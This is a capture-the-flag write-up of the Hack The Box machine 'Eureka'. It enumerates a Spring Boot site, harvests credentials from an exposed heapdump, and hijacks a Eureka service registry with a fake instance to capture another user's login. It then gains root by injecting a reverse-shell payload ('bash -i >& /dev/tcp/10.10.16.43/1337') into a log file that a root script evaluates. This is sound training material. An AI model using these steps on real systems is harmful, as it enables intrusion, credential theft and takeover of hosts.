# HTB Eureka (Hard)

## User flag:

We get an ip and the first thing we do is nmap-scanning, we get:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

We begin with heading to the website as we know no ssh credentials: 

DNS Resolves to **furni.htb**:

<img width="1439" height="635" alt="Screenshot 2025-09-01 at 21 43 59" src="https://github.com/user-attachments/assets/41158031-5587-4781-b0f0-b34bebb78b1b" />

Running ```gobuster dir -u   http://furni.htb/ -w common.txt```, we get the following:

```
about                (Status: 200) [Size: 14351]
blog                 (Status: 200) [Size: 13568]
cart                 (Status: 302) [Size: 0] [--> http://furni.htb/login]
checkout             (Status: 302) [Size: 0] [--> http://furni.htb/login]
comment              (Status: 302) [Size: 0] [--> http://furni.htb/login]
contact              (Status: 200) [Size: 10738]
error                (Status: 500) [Size: 73]
register             (Status: 200) [Size: 9028]
services             (Status: 200) [Size: 14173]
shop                 (Status: 200) [Size: 12412]
```

By trying to to find a blog id that does not exist we see the following:
<img width="656" height="219" alt="Screenshot 2025-09-01 at 21 54 30" src="https://github.com/user-attachments/assets/96417df0-39c7-4fcd-8afc-0f50ad3765ea" />

After searching google we can see its the Java framework **Spring Boot**.

Using the wordlist **Java-Spring-Boot.txt** we can run: ```gobuster dir -u http://furni.htb/ -w Java-Spring-Boot.txt```, thus getting:

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
actuator             (Status: 200) [Size: 2129]
actuator/caches      (Status: 200) [Size: 20]
actuator/env         (Status: 200) [Size: 6307]
actuator/env/home    (Status: 200) [Size: 668]
actuator/env/lang    (Status: 200) [Size: 668]
actuator/env/path    (Status: 200) [Size: 668]
actuator/features    (Status: 200) [Size: 467]
actuator/health      (Status: 200) [Size: 15]
actuator/configprops (Status: 200) [Size: 37195]
actuator/conditions  (Status: 200) [Size: 184221]
actuator/info        (Status: 200) [Size: 2]
actuator/metrics     (Status: 200) [Size: 3356]
actuator/loggers     (Status: 200) [Size: 101730]
actuator/beans       (Status: 200) [Size: 202254]
actuator/scheduledtasks (Status: 200) [Size: 54]
actuator/mappings    (Status: 200) [Size: 35560]
actuator/refresh     (Status: 405) [Size: 114]
actuator/sessions    (Status: 400) [Size: 108]
actuator/threaddump  (Status: 200) [Size: 135456]
actuator/heapdump    (Status: 200) [Size: 80165337]
Progress: 174 / 174 (100.00%)
```

Being that **heapdump** is a snapshot in time of all memory within a JVM, we can gather som information using strings.

I run:```strings heapdump | grep -Eai "(secret|passwd|password)\ ?[=|:]\ ?['|\"]?\w{1,}['|\"]?"```, and get:

```{password=0sc@r190_S0l!dP@sswd, user=oscar190}!```

Jackpot. I use these credentials for the SSH port from the beginning.

In the home folder we see another user miranda, this is our next target.

```
oscar190@eureka:/home$ ls
miranda-wise  oscar190
```

These processes are relevant:

```
oscar190@eureka:/home$ ps aux | grep -v "^root" | grep SNAPSHOT
www-data     990  2.4  7.9 2838500 317152 ?      Sl   13:21  10:21 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Eureka-Server/src/main/resources/application.yaml
www-data    2927  0.5  8.9 2885240 357372 ?      Sl   13:22   2:27 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/user-management-service/src/main/resources/application.properties
www-data    2932  0.4  8.8 2886144 353956 ?      Sl   13:22   1:41 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/Furni-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/Furni/src/main/resources/application.properties
www-data    3959  0.3  7.6 2825896 303724 ?      Sl   13:22   1:34 java -Xms100m -Xmx200m -XX:+UseG1GC -jar target/demo-0.0.1-SNAPSHOT.jar --spring.config.location=/var/www/web/cloud-gateway/src/main/resources/application.yaml
```

Locating and decompiling the the ```Furni-0.0.1-SNAPSHOT.jar``` we find within the ```application.properties```:


```
    spring.application.name=USER-MANAGEMENT-SERVICE
spring.session.store-type=jdbc
spring.cloud.inetutils.ignoredInterfaces=enp0s.*
#Eureka
eureka.client.service-url.defaultZone= http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
#Mysql
spring.jpa.hibernate.ddl-auto=none
spring.datasource.url=jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.datasource.username=oscar190
spring.datasource.password=0sc@r190_S0l!dP@sswd
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
spring.jpa.properties.hibernate.format_sql=true
#tomcat
server.address=localhost
server.port=8081
# Enable proxy support
server.forward-headers-strategy=native
# Log
logging.level.root=INFO
logging.file.name=log/application.log
logging.file.path=./
```

We detect a running Eureka server along with its login credentials:
<img width="1440" height="602" alt="Screenshot 2025-09-02 at 23 01 24" src="https://github.com/user-attachments/assets/8574246c-6f37-4667-b04b-020eb6679f3b" />

Eureka is a service discovery system used in microservice architectures, where many small services communicate with each other instead of being a single app. Each service registers itself with Eureka so other services or a gateway can find it dynamically. If registration isn’t secured, we could exploit this by registering a fake service in the registry. The gateway, trusting Eureka, would route real user traffic to our fake service, letting us intercept sensitive data or inject malicious responses, like JavaScript, that the browser would execute.

These are the instances:
<img width="1420" height="214" alt="Screenshot 2025-09-02 at 23 10 56" src="https://github.com/user-attachments/assets/1b1c918b-16bd-4fc3-a135-e5f9f7d3cfe4" />

And running ```cat /web/user-management-service/log/application.log``` we can see that miranda has logged into the ```USER-MANAGEMENT-SERVICE```:

```
...
2025-04-09T11:37:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
2025-04-09T11:38:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
2025-04-09T11:39:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
2025-04-09T11:40:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
2025-04-09T11:41:01.878Z  INFO 1172 --- [USER-MANAGEMENT-SERVICE] [http-nio-127.0.0.1-8081-exec-1] c.e.Furni.Security.LoginSuccessLogger    : User 'miranda.wise@furni.htb' logged in successfully
...
```

Thus we will create a fake service on the instance. This can be done with curl sending a POST request. For that we need to send some data to eureka. In the following format:

```
{
  "instance": {
    "instanceId": "test",
    "hostName": "LISTENER_IP",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "LISTENER_IP",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "port": {
      "$": 80,
      "@enabled": true
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    },
    "status": "UP"
  }
}
```

Put the info in a json-file to go with the curl post:

```curl -H 'Content-Type: application/json' -d @info.json 'http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE'```

Running this we can see that the service "test" is registered on the eureka server:

<img width="936" height="314" alt="Screenshot 2025-09-03 at 03 54 07" src="https://github.com/user-attachments/assets/7045132e-ed35-4e76-b7b9-c4b7cfe0e9fa" />

Then running a listening HTTP Python Server:

```
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        print(self.headers)
        print(self.rfile.read(int(self.headers.get('Content-Length', 0))).decode())
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"POST received")

if __name__ == "__main__":
    HTTPServer(('', 80), Handler).serve_forever()
```

We finally get:

```username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=H_qM_kLKtB-7PSzqaLXHBZkcVjh3V1Np_o7VkUthTPkzIIjsLcO8x3Wv0H6WC02OUJjzMq94ewBHZGBEn7jj9X1Uec8DE-re```

Cool. Decoding the URL-encoding and we get the password: ```IL!veT0Be&BeT0L0ve```

Using ssh and we get the user flag:

```
miranda-wise@eureka:~$ ls
snap  user.txt
```

## Root flag:

Running pspy tool tool to monitor running processes without the need for root priveleges. Could not download it from miranda-wise so i sent pspy over with ```scp```. Running it we get the following output:

```
2025/09/04 21:38:01 CMD: UID=0     PID=1675348 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/09/04 21:38:01 CMD: UID=0     PID=1675347 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log 
2025/09/04 21:38:01 CMD: UID=0     PID=1675349 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log 
2025/09/04 21:38:01 CMD: UID=0     PID=1675350 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log 
2025/09/04 21:38:01 CMD: UID=0     PID=1675351 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
```



```
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```


rm -f /var/www/web/user-management-service/log/application.log
echo 'HTTP Status: x a[$(bash -i >& /dev/tcp/10.10.16.43/1337 0>&1)]' > /var/www/web/user-management-service/log/application.log


nc -l 1337
